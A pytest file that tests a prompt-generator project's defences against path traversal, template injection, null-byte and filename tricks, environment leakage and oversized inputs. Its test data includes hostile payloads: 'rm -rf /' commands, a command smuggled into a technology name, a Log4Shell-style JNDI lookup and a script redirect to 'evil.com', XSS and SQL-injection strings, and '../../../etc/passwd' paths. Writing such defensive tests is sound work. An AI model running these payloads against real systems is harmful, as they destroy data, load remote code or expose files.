"""
Comprehensive tests for security and validation mechanisms.

Tests input validation, path traversal protection, injection prevention,
and secure handling of user data and file operations.
"""

import json
import os
import tempfile
from pathlib import Path
from unittest.mock import Mock, mock_open, patch

import pytest

from src.knowledge_manager import KnowledgeManager
from src.prompt_config import PromptConfig
from src.prompt_generator import PromptGenerator
from src.utils import load_json_file, read_text_file, safe_path_join


class TestPathTraversalSecurity:
    """Test protection against path traversal attacks."""

    def test_safe_path_join_basic_protection(self, tmp_path):
        """Test basic path traversal protection."""
        base_dir = str(tmp_path)

        # Test legitimate paths
        valid_paths = [
            "knowledge_base/best_practices/python.md",
            "tools/pytest.json",
            "subdir/file.txt",
            "deep/nested/structure/file.md",
        ]

        for valid_path in valid_paths:
            result = safe_path_join(base_dir, valid_path)
            assert result.startswith(os.path.abspath(base_dir))
            assert os.path.normpath(result) == result

    def test_safe_path_join_traversal_attempts(self, tmp_path):
        """Test protection against various path traversal attempts."""
        base_dir = str(tmp_path)

        # Test obvious traversal attempts
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config",
            "./../outside_dir/secret.txt",
            "valid_dir/../../../sensitive_file",
            "../etc/hosts",
            "..\\..\\.env",
        ]

        for dangerous_path in dangerous_paths:
            with pytest.raises(ValueError, match="Attempted directory traversal"):
                safe_path_join(base_dir, dangerous_path)

    def test_safe_path_join_encoded_traversal(self, tmp_path):
        """Test protection against encoded path traversal attempts."""
        base_dir = str(tmp_path)

        # Test URL-encoded and other encoded traversal attempts
        encoded_dangerous_paths = [
            "%2e%2e%2f%2e%2e%2fpasswd",  # URL encoded ../
            "..%2fpasswd",
            "dir%2f..%2f..%2fsecret",
            "..\\\\..\\\\windows",
        ]

        for dangerous_path in encoded_dangerous_paths:
            # Should either be rejected or safely handled
            try:
                result = safe_path_join(base_dir, dangerous_path)
                # If not rejected, ensure it's still within base directory
                assert result.startswith(os.path.abspath(base_dir))
            except ValueError:
                # Rejection is also acceptable
                pass

    def test_safe_path_join_null_byte_injection(self, tmp_path):
        """Test protection against null byte injection."""
        base_dir = str(tmp_path)

        # Test null byte injection attempts
        null_byte_paths = [
            "valid_file.txt\x00../../../passwd",
            "file.json\x00.exe",
            "safe\x00../dangerous",
        ]

        for dangerous_path in null_byte_paths:
            # Should be rejected or safely handled
            try:
                result = safe_path_join(base_dir, dangerous_path)
                assert "\x00" not in result
                assert result.startswith(os.path.abspath(base_dir))
            except ValueError:
                pass  # Rejection is acceptable

    def test_safe_path_join_symlink_protection(self, tmp_path):
        """Test protection against symlink attacks."""
        base_dir = str(tmp_path)

        # Create a symlink pointing outside the base directory
        outside_dir = tmp_path.parent / "outside"
        outside_dir.mkdir(exist_ok=True)

        symlink_path = tmp_path / "malicious_link"
        try:
            symlink_path.symlink_to(outside_dir)

            # Attempting to access through symlink should be safe
            result = safe_path_join(base_dir, "malicious_link/secret.txt")
            # The function should handle this safely
            assert result.startswith(os.path.abspath(base_dir))
        except (OSError, NotImplementedError):
            # Symlinks might not be supported on all systems
            pytest.skip("Symlinks not supported on this system")


class TestInputValidation:
    """Test input validation and sanitization."""

    def test_prompt_config_injection_prevention(self):
        """Test that PromptConfig prevents injection attacks."""
        # Test template injection attempts
        injection_attempts = [
            "{{ system('rm -rf /') }}",
            "{% import os %}{{ os.system('malicious') }}",
            "${jndi:ldap://evil.com/a}",
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
        ]

        for injection in injection_attempts:
            # Should accept the input but not execute it
            config = PromptConfig(
                technologies=["python"],
                task_type=f"test injection {injection}",
                task_description=f"Description with {injection}",
                code_requirements=f"Requirements with {injection} and additional text",
            )

            # Values should be stored as-is but not executed
            assert injection in config.task_type
            assert injection in config.task_description
            assert injection in config.code_requirements

    def test_template_injection_prevention(self, tmp_path):
        """Test that template rendering prevents code injection."""
        # Setup test environment
        prompts_dir = tmp_path / "prompts"
        prompts_dir.mkdir()
        base_prompts_dir = prompts_dir / "base_prompts"
        base_prompts_dir.mkdir()

        config_file = tmp_path / "config.json"
        config_data = {"python": {"best_practices": [], "tools": []}}
        with open(config_file, "w") as f:
            json.dump(config_data, f)

        # Create a secure template
        template_file = base_prompts_dir / "secure_template.txt"
        template_file.write_text(
            """
Role: {{ role }}
Technologies: {{ technologies }}
Task: {{ task_description }}
Requirements: {{ code_requirements }}
        """.strip()
        )

        generator = PromptGenerator(str(prompts_dir), str(config_file), base_path=str(tmp_path))

        # Test with malicious input
        config = PromptConfig(
            technologies=["python"],
            task_type="normal task",
            task_description="{{ config.SECRET_KEY if config else 'no secret' }}",
            code_requirements="{% for file in range(1000) %}{{ file }}{% endfor %}",
            template_name="base_prompts/secure_template.txt",
        )

        # Generate prompt - should not execute injected code
        prompt = generator.generate_prompt(config)

        # The malicious template code should be rendered as text, not executed
        assert "{{ config.SECRET_KEY" in prompt  # Should be literal text
        assert "{% for file in range" in prompt  # Should be literal text
        assert prompt.count("1000") == 0  # Loop should not execute

    def test_filename_sanitization(self, tmp_path):
        """Test that filenames are properly sanitized."""
        config_file = tmp_path / "config.json"

        # Test with dangerous technology names
        dangerous_tech_names = [
            "../../../passwd",
            "python; rm -rf /",
            "tech\\..\\sensitive",
            "tech\x00.exe",
            "tech<script>alert()</script>",
        ]

        config_data = {}
        for tech_name in dangerous_tech_names:
            config_data[tech_name] = {"best_practices": [], "tools": []}

        with open(config_file, "w") as f:
            json.dump(config_data, f)

        km = KnowledgeManager(str(config_file), base_path=str(tmp_path))

        # Should handle dangerous technology names safely
        for tech_name in dangerous_tech_names:
            practices = km.get_best_practices(tech_name)
            assert isinstance(practices, list)
            # Should not cause any security issues

    def test_json_content_validation(self, tmp_path):
        """Test validation of JSON content from files."""
        kb_dir = tmp_path / "knowledge_base" / "tools"
        kb_dir.mkdir(parents=True)

        # Test with malicious JSON content
        malicious_json_file = kb_dir / "malicious_tool.json"
        malicious_content = {
            "name": "{{ malicious_code }}",
            "description": "{% import os %}{{ os.system('rm -rf /') }}",
            "command": "; rm -rf /",
            "very_large_field": "A" * 1000000,  # Potential DoS
            "nested": {"deeply": {"nested": {"structure": "to cause parsing issues"}}},
        }

        with open(malicious_json_file, "w") as f:
            json.dump(malicious_content, f)

        # Load and verify content is handled safely
        result = load_json_file(str(malicious_json_file))
        assert result is not None
        assert result["name"] == "{{ malicious_code }}"  # Should be literal text
        assert "import os" in result["description"]  # Should be literal text
        assert len(result["very_large_field"]) == 1000000  # Should handle large content


class TestFileSystemSecurity:
    """Test file system access security."""

    def test_knowledge_manager_file_access_bounds(self, tmp_path):
        """Test that KnowledgeManager stays within allowed directories."""
        config_file = tmp_path / "config.json"
        config_data = {"python": {"best_practices": ["Test"], "tools": ["Test"]}}
        with open(config_file, "w") as f:
            json.dump(config_data, f)

        km = KnowledgeManager(str(config_file), base_path=str(tmp_path))

        # Test that knowledge manager doesn't access files outside base path
        with patch("src.knowledge_manager.safe_path_join") as mock_safe_join:
            mock_safe_join.side_effect = ValueError("Directory traversal attempted")

            # Should handle security violation gracefully
            result = km.get_best_practice_details("Test")
            assert result is None
            mock_safe_join.assert_called()

    def test_template_file_access_security(self, tmp_path):
        """Test that template loading is secure."""
        prompts_dir = tmp_path / "prompts"
        prompts_dir.mkdir()

        config_file = tmp_path / "config.json"
        config_data = {"python": {"best_practices": [], "tools": []}}
        with open(config_file, "w") as f:
            json.dump(config_data, f)

        generator = PromptGenerator(str(prompts_dir), str(config_file), base_path=str(tmp_path))

        # Test with template path traversal attempt
        config = PromptConfig(
            technologies=["python"],
            task_type="security test",
            code_requirements="test template security",
            template_name="../../../etc/passwd",
        )

        # Should handle malicious template path safely
        prompt = generator.generate_prompt(config)
        assert len(prompt) > 0  # Should generate fallback content
        assert "root:" not in prompt  # Should not contain passwd file content

    def test_file_permission_handling(self, tmp_path):
        """Test handling of files with restricted permissions."""
        # Create a file with restricted permissions
        restricted_file = tmp_path / "restricted.txt"
        restricted_file.write_text("restricted content")

        try:
            # Remove read permissions
            restricted_file.chmod(0o000)

            # Should handle permission denied gracefully
            with patch("src.utils.logger") as mock_logger:
                result = read_text_file(str(restricted_file))
                assert result is None
                mock_logger.error.assert_called()
        finally:
            # Restore permissions for cleanup
            try:
                restricted_file.chmod(0o644)
            except (PermissionError, OSError):
                pass


class TestDataSanitization:
    """Test data sanitization and escaping."""

    def test_output_sanitization(self, tmp_path):
        """Test that generated prompts are properly sanitized."""
        prompts_dir = tmp_path / "prompts"
        prompts_dir.mkdir()
        base_prompts_dir = prompts_dir / "base_prompts"
        base_prompts_dir.mkdir()

        config_file = tmp_path / "config.json"
        config_data = {"python": {"best_practices": [], "tools": []}}
        with open(config_file, "w") as f:
            json.dump(config_data, f)

        # Create template that includes user input
        template_file = base_prompts_dir / "user_input.txt"
        template_file.write_text(
            """
Task Type: {{ task_type }}
Description: {{ task_description }}
Requirements: {{ code_requirements }}
        """.strip()
        )

        generator = PromptGenerator(str(prompts_dir), str(config_file), base_path=str(tmp_path))

        # Test with potentially dangerous user input
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "{{ dangerous_variable }}",
            "{% for x in range(1000) %}{{ x }}{% endfor %}",
            "${env:SHELL}",
            '"; rm -rf /; echo "',
        ]

        for dangerous_input in dangerous_inputs:
            config = PromptConfig(
                technologies=["python"],
                task_type=f"test {dangerous_input}",
                task_description=f"description {dangerous_input}",
                code_requirements=f"requirements {dangerous_input} with more text",
                template_name="base_prompts/user_input.txt",
            )

            prompt = generator.generate_prompt(config)

            # Dangerous input should be present as literal text, not executed
            assert dangerous_input in prompt
            # Should not contain signs of code execution
            assert prompt.count("0") + prompt.count("1") < 10  # No loop execution

    def test_knowledge_content_sanitization(self, tmp_path):
        """Test that knowledge base content is safely handled."""
        config_file = tmp_path / "config.json"
        config_data = {"test": {"best_practices": ["Malicious"], "tools": ["Malicious"]}}
        with open(config_file, "w") as f:
            json.dump(config_data, f)

        kb_dir = tmp_path / "knowledge_base"
        bp_dir = kb_dir / "best_practices"
        tools_dir = kb_dir / "tools"
        bp_dir.mkdir(parents=True)
        tools_dir.mkdir(parents=True)

        # Create malicious knowledge content
        malicious_practice = bp_dir / "malicious.md"
        malicious_practice.write_text(
            """
# Malicious Practice

## Code Examples
```python
import os
os.system('rm -rf /')
```

## Template Code
{{ malicious_variable }}
{% for i in range(1000) %}Spam{% endfor %}

## Script Tags
<script>alert('xss')</script>
        """.strip()
        )

        malicious_tool = tools_dir / "malicious.json"
        malicious_content = {
            "name": "Malicious Tool",
            "description": "Tool with {{ template_code }} and <script>alert()</script>",
            "command": "rm -rf /",
            "script": "<script>location.href='http://evil.com'</script>",
        }
        with open(malicious_tool, "w") as f:
            json.dump(malicious_content, f)

        km = KnowledgeManager(str(config_file), base_path=str(tmp_path))

        # Load malicious content
        practice_content = km.get_best_practice_details("Malicious")
        tool_content = km.get_tool_details("Malicious Tool")

        # Content should be loaded as-is but not executed
        assert "{{ malicious_variable }}" in practice_content
        assert "<script>alert('xss')</script>" in practice_content
        assert "{{ template_code }}" in tool_content["description"]
        assert "<script>location.href" in tool_content["script"]


class TestConfigurationSecurity:
    """Test security of configuration handling."""

    def test_config_file_validation(self, tmp_path):
        """Test validation of configuration files."""
        # Test with malicious configuration
        config_file = tmp_path / "malicious_config.json"
        malicious_config = {
            "../../../etc": {"best_practices": [], "tools": []},
            "python; rm -rf /": {"best_practices": [], "tools": []},
            "normal": {"best_practices": ["../../../passwd"], "tools": ["../../sensitive"]},
        }

        with open(config_file, "w") as f:
            json.dump(malicious_config, f)

        # Should handle malicious config safely
        km = KnowledgeManager(str(config_file), base_path=str(tmp_path))

        # Should not cause security issues
        assert km.tech_stack_mapping is not None

        # Test accessing malicious technology entries
        practices = km.get_best_practices("../../../etc")
        assert isinstance(practices, list)

        practices = km.get_best_practices("python; rm -rf /")
        assert isinstance(practices, list)

    def test_environment_variable_security(self):
        """Test that environment variables are not leaked."""
        # This test ensures that template rendering doesn't expose environment variables
        import os

        # Set a sensitive environment variable
        os.environ["SECRET_TEST_VAR"] = "secret_value_12345"

        try:
            with tempfile.TemporaryDirectory() as tmp_dir:
                prompts_dir = Path(tmp_dir) / "prompts"
                prompts_dir.mkdir()
                base_prompts_dir = prompts_dir / "base_prompts"
                base_prompts_dir.mkdir()

                config_file = Path(tmp_dir) / "config.json"
                config_data = {"python": {"best_practices": [], "tools": []}}
                with open(config_file, "w") as f:
                    json.dump(config_data, f)

                # Create template that might try to access environment
                template_file = base_prompts_dir / "env_test.txt"
                template_file.write_text(
                    """
Task: {{ task_description }}
Environment: {{ env }}
Secret: {{ SECRET_TEST_VAR }}
                """.strip()
                )

                generator = PromptGenerator(str(prompts_dir), str(config_file), base_path=tmp_dir)

                config = PromptConfig(
                    technologies=["python"],
                    task_type="environment test",
                    task_description="test environment access",
                    code_requirements="should not expose environment variables",
                    template_name="base_prompts/env_test.txt",
                )

                prompt = generator.generate_prompt(config)

                # Should not contain the secret environment variable
                assert "secret_value_12345" not in prompt
                # Should not expose environment dictionary
                assert "PATH" not in prompt  # Common env var that shouldn't be exposed

        finally:
            # Clean up environment variable
            if "SECRET_TEST_VAR" in os.environ:
                del os.environ["SECRET_TEST_VAR"]


class TestResourceLimits:
    """Test protection against resource exhaustion attacks."""

    def test_large_file_handling(self, tmp_path):
        """Test handling of very large files."""
        # Create a very large file
        large_file = tmp_path / "large_file.txt"
        large_content = "A" * (10 * 1024 * 1024)  # 10MB file
        large_file.write_text(large_content)

        # Should handle large files without issues (but may limit content)
        result = read_text_file(str(large_file))

        # Either successfully read or handled gracefully
        if result is not None:
            assert len(result) <= len(large_content)
        # If result is None, it was handled gracefully

    def test_deep_json_nesting(self, tmp_path):
        """Test handling of deeply nested JSON structures."""
        # Create deeply nested JSON
        nested_json = tmp_path / "deep.json"

        # Create 100 levels of nesting
        content = {"level": 0}
        current = content
        for i in range(1, 100):
            current["nested"] = {"level": i}
            current = current["nested"]

        with open(nested_json, "w") as f:
            json.dump(content, f)

        # Should handle deep nesting without stack overflow
        result = load_json_file(str(nested_json))

        if result is not None:
            assert result["level"] == 0
            # Verify it can navigate the structure
            current = result
            for i in range(1, min(10, 100)):  # Check first 10 levels
                if "nested" in current:
                    current = current["nested"]
                    assert current["level"] == i
                else:
                    break
